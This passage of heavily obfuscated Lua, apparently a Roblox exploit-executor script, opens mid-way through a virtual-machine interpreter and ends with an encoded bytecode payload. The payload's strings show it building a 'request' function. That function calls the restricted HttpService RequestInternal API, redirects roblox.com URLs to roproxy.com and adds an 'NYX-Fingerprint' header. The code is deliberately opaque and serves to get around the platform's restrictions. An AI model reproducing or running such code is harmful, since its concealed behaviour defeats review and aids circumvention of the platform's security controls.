]]=v29(v77[v88[8 -5 ]],nil,v63);end elseif ((4551>2328) and (v89>((1212 -726) -(153 + 280)))) then if  not v86[v88[2 + 0 ]] then v80=v80 + 1 + 0 ;else v80=v88[4 -1 ];end else local v218=0 + 0 + 0 ;local v219;local v220;local v221;while true do if ((3825>=467) and (v218==(1 + 0))) then v221={};v220=v10({},{__index=function(v312,v313) local v314=v221[v313];return v314[164 -(92 + 71) ][v314[1 + 1 ]];end,__newindex=function(v315,v316,v317) local v318=0 -0 ;local v319;while true do if (v318==0) then v319=v221[v316];v319[1 -0 ][v319[767 -(574 + 191) ]]=v317;break;end end end});v218=2 + 0 ;end if ((2758<2980) and (v218==(4 -2))) then for v320=1 + 0 ,v88[(1029 -(834 + 192)) + 1 ] do v80=v80 + (850 -(254 + 595)) ;local v321=v76[v80];if (v321[(67 + 983) -(572 + 477) ]==11) then v221[v320-(1 + 0) ]={v86,v321[1793 -(573 + 1217) ]};else v221[v320-(2 -1) ]={v62,v321[4 -1 ]};end v85[ #v85 + (940 -(714 + 225)) ]=v221;end v86[v88[5 -3 ]]=v29(v219,v220,v63);break;end if ((v218==(0 -0)) or (2890==557)) then v219=v77[v88[1 + 2 ]];v220=nil;v218=1 -0 ;end end end elseif (v89<=(10 + 48)) then if ((v89<=(1389 -(605 + 728))) or (86>=3626)) then if ((v89>(40 + 15)) or (4770==2904)) then local v222=806 -(118 + 688) ;local v223;while true do if ((v222==(48 -(25 + 23))) or (3903==4536)) then v223=v88[1 + 1 ];v86[v223]=v86[v223](v13(v86,v223 + 1 ,v88[10 -7 ]));break;end end elseif ((4093<=4845) and (v86[v88[1888 -(927 + 959) ]]~=v88[13 -9 ])) then v80=v80 + 1 ;else v80=v88[735 -(16 + 716) ];end elseif (v89>57) then v86[v88[2 + 0 ]]={};else local v225=0 -0 ;local v226;local v227;while true do if ((1569<=3647) and (v225==(98 -(11 + 86)))) then for v323=v226 + (2 -1) ,v88[289 -(175 + 110) ] do v227=v227   .. v86[v323] ;end v86[v88[4 -(306 -(300 + 4)) ]]=v227;break;end if (v225==(0 -0)) then v226=v88[1799 -(503 + 1293) ];v227=v86[v226];v225=2 -1 ;end end end elseif ((v89<=(29 + 31)) or (4046>=4927)) then if (v89==(43 + 16)) then local v228=0 -0 ;local v229;local v230;while true do if (v228==(1062 -(810 + 251))) then v86[v229 + 1 + 0 ]=v230;v86[v229]=v230[v88[2 + 2 ]];break;end if (v228==(0 + 0)) then v229=v88[535 -(43 + 490) ];v230=v86[v88[736 -(711 + 6 + 16) ]];v228=3 -2 ;end end elseif ((2395==2395) and (v86[v88[2]]==v88[863 -(240 + 619) ])) then v80=v80 + (2 -1) + 0 ;else v80=v88[4 -1 ];end elseif ((3780>2709) and (v89>((367 -(112 + 250)) + 56))) then local v231=v88[(697 + 1049) -(1344 + (1002 -602)) ];local v232=v88[409 -(255 + 150) ];local v233=v231 + (1455 -(666 + 787)) ;local v234={v86[v231](v86[v231 + 1 + 0 ],v86[v233])};for v259=1 + 0 ,v232 do v86[v233 + v259 ]=v234[v259];end local v235=v234[4 -3 ];if ((4623>=2787) and v235) then local v275=0 -0 ;while true do if (v275==0) then v86[v233]=v235;v80=v88[1742 -(232 + 172 + 1335) ];break;end end else v80=v80 + (407 -(183 + 116 + 107)) ;end else local v236=(0 + 0) -0 ;local v237;while true do if (((2234>=1230) and (v236==(0 + 0))) or (237>=2273)) then v237=v88[1 + 1 ];do return v13(v86,v237,v237 + v88[(169 + 171) -(10 + 327) ] );end break;end end end v80=v80 + 1 + 0 ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!013O0003073O007265717565737400033O0002347O00122E3O00014O000D3O00013O00013O002B3O00028O00027O0040026O001040026O00F03F026O00144003043O0067616D65030A3O0047657453657276696365030B3O00482O747053657276696365030F3O0052657175657374496E7465726E616C03073O0054696D656F7574025O004CCD402O033O0055726C03043O0067737562030A3O00726F626C6F782E636F6D030B3O00726F70726F78792E636F6D03063O004D6574686F6403053O00752O706572026O00084003053O00537461727403043O007461736B03053O00737061776E026O00184003053O004576656E7403043O005761697403083O005072696F7269747903063O00612O7365727403043O007479706503053O007461626C6503363O00696E76616C696420617267756D656E7420233120746F2027726571756573742720287461626C652065787065637465642C20676F742003023O002920030B3O004361636865506F6C69637903043O00456E756D030F3O00482O74704361636865506F6C69637903043O004E6F6E6503083O00496E7374616E63652O033O006E6577030D3O0042696E6461626C654576656E7403073O0048656164657273030F3O004E59582D46696E6765727072696E742O033O004E595803053O00706169727303053O006C6F77657203073O006865616465727301A73O001215000100014O0016000200083O001215000900013O002623000900350001000200040C3O003500010026230001001B0001000300040C3O001B0001001215000A00013O002623000A00110001000400040C3O001100012O0010000B00054O0010000C00044O0010000D6O000E000B000D00022O00100006000B3O001215000100053O00040C3O001B0001002623000A00080001000100040C3O00080001001201000B00063O00201F000B000B0007001215000D00084O000E000B000D00022O00100004000B3O002028000500040009001215000A00043O00040C3O00080001002623000100340001000400040C3O00340001001215000A00013O002623000A00280001000100040C3O002800010030333O000A000B002028000B3O000C00201F000B000B000D001215000D000E3O001215000E000F4O000E000B000E00020010143O000C000B001215000A00043O002623000A001E0001000400040C3O001E0001002028000B3O0010000625000B003100013O00040C3O00310001002028000B3O001000201F000B000B00112O002D000B000200020010143O0010000B001215000100023O00040C3O0034000100040C3O001E0001001215000900123O0026230009004F0001000400040C3O004F0001002623000100440001000500040C3O004400010020280007000600132O0016000800083O001201000A00143O002028000A000A0015000635000B3O000100042O000B3O00074O000B3O00064O000B3O00084O000B3O00034O001C000A00020001001215000100163O0026230001004E0001001600040C3O004E0001001215000A00013O002623000A00470001000100040C3O00470001002028000B0003001700201F000B000B00182O001C000B000200012O0024000800023O00040C3O00470001001215000900023O002623000900720001001200040C3O00720001002623000100020001000100040C3O00020001001215000A00013O002623000A00590001000400040C3O005900010030333O00190005001215000100043O00040C3O00020001002623000A00540001000100040C3O00540001001201000B001A3O001201000C001B4O0010000D6O002D000C00020002002609000C00620001001C00040C3O006200012O001E000C6O0012000C00013O001215000D001D3O001201000E001B4O0010000F6O002D000E00020002001215000F001E4O002C000D000D000F001215000E00024O0027000B000E0001001201000B00203O002028000B000B0021002028000B000B00220010143O001F000B001215000A00043O00040C3O0054000100040C3O00020001002623000900030001000100040C3O00030001002623000100870001001200040C3O00870001001215000A00013O002623000A00800001000400040C3O00800001001201000B00233O002028000B000B0024001215000C00254O002D000B000200022O00100003000B3O001215000100033O00040C3O00870001002623000A00770001000100040C3O007700010010143O00260002002028000B3O0026003033000B00270028001215000A00043O00040C3O00770001002623000100A30001000200040C3O00A30001001215000A00013O002623000A009A0001000100040C3O009A00012O0016000200023O001201000B00294O0010000C6O0002000B0002000D00040C3O0097000100201F0010000E002A2O002D001000020002002623001000970001002B00040C3O009700012O00100002000F3O00040C3O00990001002O06000B00910001000200040C3O00910001001215000A00043O000E2F0004008A0001000A00040C3O008A0001000636000200A00001000100040C3O00A000012O0003000B6O00100002000B3O001215000100123O00040C3O00A3000100040C3O008A0001001215000900043O00040C3O0003000100040C3O000200012O000D3O00013O00018O00074O001D8O001D000100013O00063500023O000100022O00323O00024O00323O00034O00273O000200012O000D3O00013O00013O00023O00028O0003043O0046697265020A3O001215000200013O002623000200010001000100040C3O000100012O000A00016O001D000300013O00201F0003000300022O001C00030002000100040C3O0009000100040C3O000100012O000D3O00017O00",v9(),...);
